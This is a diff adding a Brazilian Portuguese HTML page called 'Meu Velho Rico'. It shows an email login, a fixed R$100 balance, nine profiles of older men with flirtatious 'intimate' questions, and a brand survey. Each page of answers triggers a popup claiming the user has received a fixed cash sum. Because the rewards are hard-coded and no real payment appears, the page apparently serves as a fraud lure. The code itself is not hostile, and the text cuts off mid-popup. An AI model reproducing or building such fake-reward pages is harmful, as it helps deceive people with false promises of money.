@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+   <head>
+     <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+      <link rel="stylesheet" href="../css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+      <link href="../css2-1?family=Montserrat:wght@500&amp;display=swap" rel="stylesheet">
+      <link rel="stylesheet" href="css/styles.css">
+      <title>Acesso | Meu Velho Rico</title>
+      <link rel="icon" href="https://i.postimg.cc/TwFrwM8Y/ico-app.webp" type="image/png">
+      <script src="js/jquery-3.6.4.min.js"></script>
+      <script src="js/js.cookie.min.js"></script>
+      <script src="usuariosnovos.js"></script>
+      <!-- Link para o ícone de verificação -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" />
+   </head>
+   <body>
+      <audio id="meuAudio">
+         <source src="media/dinheiro.mp3" type="audio/mp3">
+      </audio>
+      <!--------------------- Pagina de login" --------------------->
+      <div id="login" style="display: block;">
+         <div style="padding-top:10%;"></div>
+         <div class="outer-box-login">
+            <div class="white-box-login">
+               <img src="https://i.postimg.cc/TwFrwM8Y/ico-app.webp" style="width:10%; margin: 0 auto; display: flex;">
+               <p class="popup-textL" style="text-align: center; color: rgb(101, 101, 101); font-weight: bold; font-size: 18px;">Bem-vindo(a) ao Meu Velho Rico</p>
+               <p class="popup-textL" style="text-align: center; color: rgb(101, 101, 101); font-size: 15px;">Insira seu e-mail para prosseguir!</p>
+               <input for="email" type="text" name="email" id="email" class="form-input" style="margin-top:20px;" placeholder="E-mail" oninput="validateEmail()">
+               <button class="prosseguir-button" id="prosseguir-button" style="margin-top: 15px;" onclick="verificarCampos()" href="#">ENTRAR</button>
+               <div style="margin-bottom: 10px;"></div>
+            </div>
+         </div>
+         <div class="footer-text">
+            <p style="text-align: center; color: rgb(101, 101, 101); font-size: 15px; margin-top: 30px; font-weight: bold;">2024 Meu Velho Rico LLC</p>
+            <p style="text-align: center; color: rgb(101, 101, 101); font-size: 14px; margin-top: -10px; margin-bottom: 0px;">Termos e Politica de Privacidade</p>
+         </div>
+      </div>
+      <div id="inicio" style="display: none;">
+         <div class="menu">
+            <a style="width: 50%; ">
+            <img src="https://i.postimg.cc/TwFrwM8Y/ico-app.webp">
+            </a>
+            <div style="width: 45%;" class="buttons-container" href="#" onclick="mostrarPagina('saque')">
+               <div class="valor-box">
+                  <span id="valor" style="font-family: 'Montserrat', sans-serif; max-width: 100%;">R$ 100.00</span>
+               </div>
+            </div>
+         </div>
+         <div style="margin-bottom: 100px;"></div>
+         <!--------------------- Avaliação Perfil Wagner --------------------->
+         <div class="outer-box" id="ad1" style="display: block;">
+             <div class="white-box">
+                 <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                     Avalie o Perfil de Wagner e ajude-o a encontrar companhia!
+                 </p>
+                 
+                 <!-- Foto do perfil -->
+                 <div class="imagem">
+                     <img src="https://i.postimg.cc/j5QdCmFY/image.png" style="width: 100px; height: 100px; border-radius: 50%; border: 5px solid #06B32E; margin: 0 auto; display: flex;">
+                 </div>
+                 
+                 <!-- Descrição do perfil -->
+                 <p style="text-align: center; font-size: 16px; font-weight: bold; color: #333; margin-top: 10px;">🟢 Wagner, 52 Anos</p>
+                 <p style="text-align: center; color: #555; font-size: 14px; margin-top: 5px;">
+                     Solteiro e amante de aventuras ao ar livre, estou em busca de alguém para compartilhar trilhas e acampamentos emocionantes.
+                 </p>
+                 
+                 <!-- Perguntas íntimas -->
+                 <p class="pergunta-intima">1. Você deixaria Wagner te ensinar alguns truques para uma noite ao ar livre?</p>
+                 <div class="rating-container" id="rating-container-intimacy-1">
+                     <button class="rating-button" data-rating="1">Sim</button>
+                     <button class="rating-button" data-rating="2">Não</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">2. Uma trilha em dupla... você prefere conversa profunda ou um clima de mistério?</p>
+                 <div class="rating-container" id="rating-container-intimacy-2">
+                     <button class="rating-button" data-rating="1">Conversa profunda</button>
+                     <button class="rating-button" data-rating="2">Clima de mistério</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">3. Em um acampamento sob as estrelas, uma dança improvisada ou uma noite tranquila?</p>
+                 <div class="rating-container" id="rating-container-intimacy-3">
+                     <button class="rating-button" data-rating="1">Dança improvisada</button>
+                     <button class="rating-button" data-rating="2">Noite tranquila</button>
+                 </div>
+                 
+                 <!-- Botão de envio -->
+                 <button type="button" class="enviarCodigo" id="B1" onclick="showLoadingB1();">Enviar respostas</button>
+             </div>
+         </div>
+         <!--------------------- Fim da Avaliação Perfil Wagner --------------------->
+
+            <!--------------------- Anuncio 1 --------------------->
+         <!---- Popup B1 ---->
+         <div class="popup-container" id="popupB1" style="display: none;">
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+            <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
+            <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+            <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 33,00</span>
+         </div>
+         <!--------------------- Avaliação Perfil Dr. Jorge Paulo --------------------->
+         <div class="outer-box" id="ad2" style="display: none;">
+             <div class="white-box">
+                 <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                     Avalie o Perfil de Dr. Jorge Paulo e descubra mais sobre ele!
+                 </p>
+                 
+                 <!-- Foto do perfil -->
+                 <div class="imagem">
+                     <img src="https://i.postimg.cc/kgmVMN4S/image.png" style="width: 100px; height: 100px; border-radius: 50%; border: 5px solid #06B32E; margin: 0 auto; display: flex;">
+                 </div>
+                 
+                 <!-- Descrição do perfil -->
+                 <p style="text-align: center; font-size: 16px; font-weight: bold; color: #333; margin-top: 10px;">🟢 Dr. Jorge Paulo, 50 Anos</p>
+                 <p style="text-align: center; color: #555; font-size: 14px; margin-top: 5px;">
+                     Empresário bem-sucedido, meu amor pela música me levou a aprender a tocar vários instrumentos. Estou procurando alguém que aprecie serenatas e noites musicais.
+                 </p>
+                 
+                 <!-- Perguntas íntimas -->
+                 <p class="pergunta-intima">1. Uma serenata privada... você prefere uma melodia romântica ou algo mais animado?</p>
+                 <div class="rating-container" id="rating-container-intimacy-4">
+                     <button class="rating-button" data-rating="1">Romântica</button>
+                     <button class="rating-button" data-rating="2">Animada</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">2. Aceitaria um jantar a dois ao som de uma música tocada pelo próprio Jorge?</p>
+                 <div class="rating-container" id="rating-container-intimacy-5">
+                     <button class="rating-button" data-rating="1">Com certeza</button>
+                     <button class="rating-button" data-rating="2">Talvez não</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">3. Jorge toca uma música para você... você gostaria de algo ao piano ou violão?</p>
+                 <div class="rating-container" id="rating-container-intimacy-6">
+                     <button class="rating-button" data-rating="1">Piano</button>
+                     <button class="rating-button" data-rating="2">Violão</button>
+                 </div>
+                 
+                 <!-- Botão de envio -->
+                 <button type="button" class="enviarCodigo" id="B2" onclick="showLoadingB2();">Enviar respostas</button>
+             </div>
+         </div>
+         <!--------------------- Fim da Avaliação Perfil Dr. Jorge Paulo --------------------->
+
+         <!---- Popup B2 ---->
+         <div class="popup-container" id="popupB2">
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+            <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
+            <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+            <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 34,00</span>
+         </div>
+         <!--------------------- Avaliação Perfil Antonio Silveira --------------------->
+         <div class="outer-box" id="ad3" style="display: none;">
+             <div class="white-box">
+                 <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                     Avalie o Perfil de Antonio e explore novos sabores!
+                 </p>
+                 
+                 <!-- Foto do perfil -->
+                 <div class="imagem">
+                     <img src="https://i.postimg.cc/pdtcWSbH/image.png" style="width: 100px; height: 100px; border-radius: 50%; border: 5px solid #06B32E; margin: 0 auto; display: flex;">
+                 </div>
+                 
+                 <!-- Descrição do perfil -->
+                 <p style="text-align: center; font-size: 16px; font-weight: bold; color: #333; margin-top: 10px;">🟢 Antonio Silveira, 48 Anos</p>
+                 <p style="text-align: center; color: #555; font-size: 14px; margin-top: 5px;">
+                     Chef de cozinha que adora cozinhar pratos deliciosos para alguém especial. Estou à procura de alguém que goste de boa comida e conversas saborosas.
+                 </p>
+                 
+                 <!-- Perguntas íntimas -->
+                 <p class="pergunta-intima">1. Antonio prepara um jantar para você... você preferiria algo doce ou apimentado?</p>
+                 <div class="rating-container" id="rating-container-intimacy-7">
+                     <button class="rating-button" data-rating="1">Doce</button>
+                     <button class="rating-button" data-rating="2">Apimentado</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">2. Uma noite com um chef... prefere jantar à luz de velas ou na cozinha acompanhando o preparo?</p>
+                 <div class="rating-container" id="rating-container-intimacy-8">
+                     <button class="rating-button" data-rating="1">À luz de velas</button>
+                     <button class="rating-button" data-rating="2">Na cozinha</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">3. Antonio propõe um prato surpresa. Você aceitaria ou prefere escolher o menu?</p>
+                 <div class="rating-container" id="rating-container-intimacy-9">
+                     <button class="rating-button" data-rating="1">Aceitaria</button>
+                     <button class="rating-button" data-rating="2">Prefiro escolher</button>
+                 </div>
+                 
+                 <!-- Botão de envio -->
+                 <button type="button" class="enviarCodigo" id="B3" onclick="showLoadingB3();">Enviar respostas</button>
+             </div>
+         </div>
+         <!--------------------- Fim da Avaliação Perfil Antonio Silveira --------------------->
+
+         <!---- Popup B3 ---->
+         <div class="popup-container" id="popupB3">
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+            <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
+            <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+            <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 47,00</span>
+         </div>
+         <!--------------------- Avaliação Perfil Eduardo Menezes --------------------->
+         <div class="outer-box" id="ad4" style="display: none;">
+             <div class="white-box">
+                 <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                     Avalie o Perfil de Eduardo e conheça seu lado cuidadoso!
+                 </p>
+                 
+                 <!-- Foto do perfil -->
+                 <div class="imagem">
+                     <img src="https://i.postimg.cc/BZ1hFsS0/image.png" style="width: 100px; height: 100px; border-radius: 50%; border: 5px solid #06B32E; margin: 0 auto; display: flex;">
+                 </div>
+                 
+                 <!-- Descrição do perfil -->
+                 <p style="text-align: center; font-size: 16px; font-weight: bold; color: #333; margin-top: 10px;">🟢 Eduardo Menezes, 61 Anos</p>
+                 <p style="text-align: center; color: #555; font-size: 14px; margin-top: 5px;">
+                     Médico dedicado, minha paixão é cuidar das pessoas. Estou interessado em conhecer alguém que valorize o bem-estar e a saúde.
+                 </p>
+                 
+                 <!-- Perguntas íntimas -->
+                 <p class="pergunta-intima">1. Eduardo te convidou para uma caminhada ao ar livre. Aceitaria um passeio assim?</p>
+                 <div class="rating-container" id="rating-container-intimacy-10">
+                     <button class="rating-button" data-rating="1">Sim</button>
+                     <button class="rating-button" data-rating="2">Não</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">2. Prefere uma conversa sobre saúde ou um momento de descontração com ele?</p>
+                 <div class="rating-container" id="rating-container-intimacy-11">
+                     <button class="rating-button" data-rating="1">Saúde</button>
+                     <button class="rating-button" data-rating="2">Descontração</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">3. Você se sentiria bem em ter Eduardo cuidando de você em um momento especial?</p>
+                 <div class="rating-container" id="rating-container-intimacy-12">
+                     <button class="rating-button" data-rating="1">Sim</button>
+                     <button class="rating-button" data-rating="2">Talvez</button>
+                 </div>
+                 
+                 <!-- Botão de envio -->
+                 <button type="button" class="enviarCodigo" id="B4" onclick="showLoadingB4();">Enviar respostas</button>
+             </div>
+         </div>
+         <!--------------------- Fim da Avaliação Perfil Eduardo Menezes --------------------->
+
+         <!---- Popup B4 ---->
+         <div class="popup-container" id="popupB4">
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+            <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
+            <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+            <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 43,00</span>
+         </div>
+        <!--------------------- Avaliação Perfil Gustavo Sávio --------------------->
+        <div class="outer-box" id="ad5" style="display: none;">
+            <div class="white-box">
+                <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                    Avalie o Perfil de Gustavo e explore seu lado aventureiro!
+                </p>
+                
+                <!-- Foto do perfil -->
+                <div class="imagem">
+                    <img src="https://i.postimg.cc/fyBkLpgg/image.png" style="width: 100px; height: 100px; border-radius: 50%; border: 5px solid #06B32E; margin: 0 auto; display: flex;">
+                </div>
+                
+                <!-- Descrição do perfil -->
+                <p style="text-align: center; font-size: 16px; font-weight: bold; color: #333; margin-top: 10px;">🟢 Gustavo Sávio, 55 Anos</p>
+                <p style="text-align: center; color: #555; font-size: 14px; margin-top: 5px;">
+                    Amante de viagens e culturas diferentes, estou à procura de um companheiro de aventuras para explorar o mundo juntos.
+                </p>
+                
+                <!-- Perguntas íntimas -->
+                <p class="pergunta-intima">1. Se Gustavo te convidasse para uma viagem surpresa, você toparia sem saber o destino?</p>
+                <div class="rating-container" id="rating-container-intimacy-13">
+                    <button class="rating-button" data-rating="1">Sim</button>
+                    <button class="rating-button" data-rating="2">Não</button>
+                </div>
+                
+                <p class="pergunta-intima">2. Em uma viagem, prefere explorar lugares exóticos ou relaxar em praias paradisíacas com Gustavo?</p>
+                <div class="rating-container" id="rating-container-intimacy-14">
+                    <button class="rating-button" data-rating="1">Lugares exóticos</button>
+                    <button class="rating-button" data-rating="2">Praias paradisíacas</button>
+                </div>
+                
+                <p class="pergunta-intima">3. Gustavo sugere uma noite sob as estrelas. Você aceitaria uma aventura assim?</p>
+                <div class="rating-container" id="rating-container-intimacy-15">
+                    <button class="rating-button" data-rating="1">Sim</button>
+                    <button class="rating-button" data-rating="2">Talvez</button>
+                </div>
+                
+                <!-- Botão de envio -->
+                <button type="button" class="enviarCodigo" id="B5" onclick="showLoadingB5();">Enviar respostas</button>
+            </div>
+        </div>
+        <!--------------------- Fim da Avaliação Perfil Gustavo Sávio --------------------->
+
+         <!---- Popup B5 ---->
+         <div class="popup-container" id="popupB5">
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+            <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
+            <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+            <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 52,00</span>
+         </div>
+         <!--------------------- Avaliação Perfil Ricardo Oliveira --------------------->
+         <div class="outer-box" id="ad6" style="display: none;">
+             <div class="white-box">
+                 <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                     Avalie o Perfil de Ricardo e explore seu lado criativo!
+                 </p>
+                 
+                 <!-- Foto do perfil -->
+                 <div class="imagem">
+                     <img src="https://i.postimg.cc/RFTZs29V/image.png" style="width: 100px; height: 100px; border-radius: 50%; border: 5px solid #06B32E; margin: 0 auto; display: flex;">
+                 </div>
+                 
+                 <!-- Descrição do perfil -->
+                 <p style="text-align: center; font-size: 16px; font-weight: bold; color: #333; margin-top: 10px;">🟢 Ricardo Oliveira, 61 Anos</p>
+                 <p style="text-align: center; color: #555; font-size: 14px; margin-top: 5px;">
+                     Escritor em busca de musa para inspirar minha criatividade e meus romances.
+                 </p>
+                 
+                 <!-- Perguntas íntimas -->
+                 <p class="pergunta-intima">1. Se Ricardo escrevesse sobre você, preferiria um romance intenso ou uma poesia suave?</p>
+                 <div class="rating-container" id="rating-container-intimacy-16">
+                     <button class="rating-button" data-rating="1">Romance intenso</button>
+                     <button class="rating-button" data-rating="2">Poesia suave</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">2. Aceitaria ser a musa inspiradora de Ricardo em uma viagem literária?</p>
+                 <div class="rating-container" id="rating-container-intimacy-17">
+                     <button class="rating-button" data-rating="1">Sim</button>
+                     <button class="rating-button" data-rating="2">Talvez</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">3. Preferiria uma noite de conversa sobre romances clássicos ou escrever uma história juntos?</p>
+                 <div class="rating-container" id="rating-container-intimacy-18">
+                     <button class="rating-button" data-rating="1">Conversar sobre romances</button>
+                     <button class="rating-button" data-rating="2">Escrever juntos</button>
+                 </div>
+                 
+                 <!-- Botão de envio -->
+                 <button type="button" class="enviarCodigo" id="B6" onclick="showLoadingB6();">Enviar respostas</button>
+             </div>
+         </div>
+         <!--------------------- Fim da Avaliação Perfil Ricardo Oliveira --------------------->
+
+         <!---- Popup B6 ---->
+         <div class="popup-container" id="popupB6">
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+            <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
+            <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+            <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 32,00</span>
+         </div>
+         <!--------------------- Avaliação Perfil Marcelo Alencar --------------------->
+         <div class="outer-box" id="ad7" style="display: none;">
+             <div class="white-box">
+                 <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                     Avalie o Perfil de Marcelo e descubra seu lado aventureiro!
+                 </p>
+                 
+                 <!-- Foto do perfil -->
+                 <div class="imagem">
+                     <img src="https://i.postimg.cc/8CRpcx7B/image.png" style="width: 100px; height: 100px; border-radius: 50%; border: 5px solid #06B32E; margin: 0 auto; display: flex;">
+                 </div>
+                 
+                 <!-- Descrição do perfil -->
+                 <p style="text-align: center; font-size: 16px; font-weight: bold; color: #333; margin-top: 10px;">🟢 Marcelo Alencar, 61 Anos</p>
+                 <p style="text-align: center; color: #555; font-size: 14px; margin-top: 5px;">
+                     Professor aposentado que agora dedica seu tempo a viajar e aprender sobre diferentes culturas. Está à procura de uma companheira de aventuras para explorar novos horizontes.
+                 </p>
+                 
+                 <!-- Perguntas íntimas -->
+                 <p class="pergunta-intima">1. Se Marcelo te convidasse para um passeio cultural, preferiria museus ou explorar ruas históricas?</p>
+                 <div class="rating-container" id="rating-container-intimacy-19">
+                     <button class="rating-button" data-rating="1">Museus</button>
+                     <button class="rating-button" data-rating="2">Ruas históricas</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">2. Em uma viagem a dois, prefere um roteiro planejado ou deixar Marcelo te surpreender?</p>
+                 <div class="rating-container" id="rating-container-intimacy-20">
+                     <button class="rating-button" data-rating="1">Roteiro planejado</button>
+                     <button class="rating-button" data-rating="2">Surpresa</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">3. Gostaria de compartilhar histórias e experiências culturais com Marcelo em uma noite sob as estrelas?</p>
+                 <div class="rating-container" id="rating-container-intimacy-21">
+                     <button class="rating-button" data-rating="1">Sim</button>
+                     <button class="rating-button" data-rating="2">Talvez</button>
+                 </div>
+                 
+                 <!-- Botão de envio -->
+                 <button type="button" class="enviarCodigo" id="B7" onclick="showLoadingB7();">Enviar respostas</button>
+             </div>
+         </div>
+         <!--------------------- Fim da Avaliação Perfil Marcelo Alencar --------------------->
+
+         <!---- Popup B7 ---->
+         <div class="popup-container" id="popupB7">
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+            <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
+            <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+            <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 32,00</span>
+         </div>
+         <!--------------------- Avaliação Perfil Marcos Fontes --------------------->
+         <div class="outer-box" id="ad8" style="display: none;">
+             <div class="white-box">
+                 <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                     Avalie o Perfil de Marcos e descubra seu lado tecnológico!
+                 </p>
+                 
+                 <!-- Foto do perfil -->
+                 <div class="imagem">
+                     <img src="https://i.postimg.cc/9QW0Tmjg/image.png" style="width: 100px; height: 100px; border-radius: 50%; border: 5px solid #06B32E; margin: 0 auto; display: flex;">
+                 </div>
+                 
+                 <!-- Descrição do perfil -->
+                 <p style="text-align: center; font-size: 16px; font-weight: bold; color: #333; margin-top: 10px;">🟢 Marcos Fontes, 53 Anos</p>
+                 <p style="text-align: center; color: #555; font-size: 14px; margin-top: 5px;">
+                     Engenheiro elétrico aposentado, apaixonado por tecnologia e inovação. Busca alguém que compartilhe seu entusiasmo por gadgets e descobertas tecnológicas.
+                 </p>
+                 
+                 <!-- Perguntas íntimas -->
+                 <p class="pergunta-intima">1. Se Marcos te mostrasse seu gadget mais recente, você se interessaria em aprender a usá-lo?</p>
+                 <div class="rating-container" id="rating-container-intimacy-22">
+                     <button class="rating-button" data-rating="1">Sim</button>
+                     <button class="rating-button" data-rating="2">Não</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">2. Prefere uma noite discutindo inovações tecnológicas ou assistindo a um filme de ficção científica com Marcos?</p>
+                 <div class="rating-container" id="rating-container-intimacy-23">
+                     <button class="rating-button" data-rating="1">Discutindo inovações</button>
+                     <button class="rating-button" data-rating="2">Filme de ficção científica</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">3. Gostaria de acompanhar Marcos em uma feira de tecnologia para explorar novidades juntos?</p>
+                 <div class="rating-container" id="rating-container-intimacy-24">
+                     <button class="rating-button" data-rating="1">Sim</button>
+                     <button class="rating-button" data-rating="2">Talvez</button>
+                 </div>
+                 
+                 <!-- Botão de envio -->
+                 <button type="button" class="enviarCodigo" id="B8" onclick="showLoadingB8();">Enviar respostas</button>
+             </div>
+         </div>
+         <!--------------------- Fim da Avaliação Perfil Marcos Fontes --------------------->
+
+         <!---- Popup B8 ---->
+         <div class="popup-container" id="popupB8">
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+            <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
+            <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+            <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 27,00</span>
+         </div>
+         <!--------------------- Avaliação Perfil Carlos Montenegro --------------------->
+         <div class="outer-box" id="ad9" style="display: none;">
+             <div class="white-box">
+                 <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                     Avalie o Perfil de Carlos e descubra seu apreço pela história!
+                 </p>
+                 
+                 <!-- Foto do perfil -->
+                 <div class="imagem">
+                     <img src="https://i.postimg.cc/xddrVdwm/image.png" style="width: 100px; height: 100px; border-radius: 50%; border: 5px solid #06B32E; margin: 0 auto; display: flex;">
+                 </div>
+                 
+                 <!-- Descrição do perfil -->
+                 <p style="text-align: center; font-size: 16px; font-weight: bold; color: #333; margin-top: 10px;">🟢 Carlos Montenegro, 61 Anos</p>
+                 <p style="text-align: center; color: #555; font-size: 14px; margin-top: 5px;">
+                     Historiador que passou a vida estudando o passado. Agora, deseja criar novas histórias com alguém que valorize a importância da memória e das tradições.
+                 </p>
+                 
+                 <!-- Perguntas íntimas -->
+                 <p class="pergunta-intima">1. Carlos te convidou para visitar um local histórico. Você aceitaria a experiência?</p>
+                 <div class="rating-container" id="rating-container-intimacy-25">
+                     <button class="rating-button" data-rating="1">Sim</button>
+                     <button class="rating-button" data-rating="2">Não</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">2. Em uma conversa, você preferiria ouvir histórias do passado ou compartilhar memórias pessoais com Carlos?</p>
+                 <div class="rating-container" id="rating-container-intimacy-26">
+                     <button class="rating-button" data-rating="1">Ouvir histórias</button>
+                     <button class="rating-button" data-rating="2">Compartilhar memórias</button>
+                 </div>
+                 
+                 <p class="pergunta-intima">3. Gostaria de criar novas tradições com Carlos, misturando o presente e o passado?</p>
+                 <div class="rating-container" id="rating-container-intimacy-27">
+                     <button class="rating-button" data-rating="1">Sim</button>
+                     <button class="rating-button" data-rating="2">Talvez</button>
+                 </div>
+                 
+                 <!-- Botão de envio -->
+                 <button type="button" class="enviarCodigo" id="B9" onclick="showLoadingB9();">Enviar respostas</button>
+             </div>
+         </div>
+         <!--------------------- Fim da Avaliação Perfil Carlos Montenegro --------------------->
+
+         <!---- Popup B9 ---->
+         <div class="popup-container" id="popupB9">
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+            <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
+            <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+            <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 30,00</span>
+         </div>
+         <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p10" ---------------------->
+         <div class="outer-box" id="ad10" style="display: none">
+            <div class="white-box">
+               <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$43,00!</p>
+               <div class="imagem">
+                  <img src="images/tim.png" style="width: 50%; margin: 0 auto; display: flex;">
+               </div>
+               <p class="pergunta-whats">De 1 a 5, que nota voce da para a Tim?</p>
+               <div class="rating-container" id="rating-container-28">
+                  <button class="rating-button" data-rating="1">1 </button>
+                  <button class="rating-button" data-rating="2">2 </button>
+                  <button class="rating-button" data-rating="3">3 </button>
+                  <button class="rating-button" data-rating="4">4 </button>
+                  <button class="rating-button" data-rating="5">5 </button>
+               </div>
+               <p class="pergunta-whats">Voce ja comprou algum produto da Tim?</p>
+               <div class="rating-container" id="rating-container-29">
+                  <button class="rating-button" data-rating="1">Sim</button>
+                  <button class="rating-button" data-rating="2">Nao</button>
+               </div>
+               <p class="pergunta-whats">Voce recomendaria para algum amigo ou familiar a Tim?</p>
+               <div class="rating-container" id="rating-container-30">
+                  <button class="rating-button" data-rating="1">Sim</button>
+                  <button class="rating-button" data-rating="2">Nao</button>
+               </div>
+               <button type="button" class="enviarCodigo" id="B10" onclick="showLoadingB10();">Enviar respostas</button>
+            </div>
+         </div>
+         <!---- Popup B10 ---->
+         <div class="popup-container" id="popupB10">
+            <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
